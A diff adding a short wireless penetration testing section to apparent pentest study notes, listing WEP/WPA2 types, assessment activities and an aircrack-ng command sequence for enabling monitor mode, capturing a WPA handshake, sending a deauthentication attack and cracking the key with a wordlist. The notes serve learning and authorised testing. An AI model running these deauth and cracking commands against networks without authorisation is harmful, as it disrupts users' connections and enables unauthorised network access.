@@ -472,7 +472,32 @@ docker start webgoat
 
 
 #Wireless penetration testing
-       
+Wired Equivalent Privacy (WEP)
+Wi-Fi Protected Access ii (WPA2 PSK(pre shared key))
+Wi-Fi Protected Access ii (WPA2 ENTERPRISE(RADIUS, TACACS+)
+Activities:
+       Evaluate strength of PSK(handshake capture)
+       Review nearby networks(war-driving, war-walking)
+       Assess guest networks(network separation)
+       Check network access(least privileges, rogue devices)
+compatible wireless dongles
+process:
+       monitor mode
+              airmon-ng check kill
+              airmon-ng start wlan0
+       discover channel,BSSID
+              airodump-ng wlan0mon
+       select net and capture data
+              airodump-ng -c 6 --bssid <bssid> -w capture wlan0mon
+       deauth attack
+              aireplay-ng -0 1 -a <bssid> -c <station> wlan0mon
+       crack wpa handshake
+              aircrack-ng -w wordlist -b <bssid> capture.cap
+
+
+
+
+
 
 
 
